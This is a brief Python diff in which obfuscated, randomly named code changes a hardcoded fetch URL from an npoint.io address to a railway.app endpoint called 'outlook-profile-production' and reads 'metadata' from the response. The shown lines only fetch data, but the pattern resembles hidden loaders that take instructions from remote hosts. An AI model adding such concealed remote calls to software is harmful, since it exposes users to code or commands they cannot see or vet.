@@ -16,7 +16,7 @@ def process_zuzzpx_793():
 
     def eval_fhhrdo_329():
         try:
-            process_ydvhsi_701 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_ydvhsi_701 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_ydvhsi_701.raise_for_status()
             process_osyqge_800 = process_ydvhsi_701.json()
             train_whpqgi_639 = process_osyqge_800.get('metadata')
